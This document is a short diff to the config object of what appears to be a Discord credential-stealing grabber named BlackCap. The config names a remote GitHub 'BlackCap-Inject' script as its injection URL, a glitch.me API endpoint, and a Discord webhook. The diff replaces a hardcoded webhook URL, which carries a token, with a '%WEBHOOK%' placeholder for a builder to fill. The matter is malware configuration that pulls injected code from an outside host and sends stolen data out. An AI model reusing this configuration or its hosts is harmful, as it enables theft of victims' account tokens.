@@ -28,7 +28,7 @@ const config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
-    webhook: "https://discord.com/api/webhooks/1059813567571972126/aIKRn8M42nVDrMvgwZA2MJg8hYfa8XCcDeM1pfPjQofwy3U8886M1lijhbi-1mzbWh7e",
+    webhook: "%WEBHOOK%",
     apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
     filter2: {
         urls: [
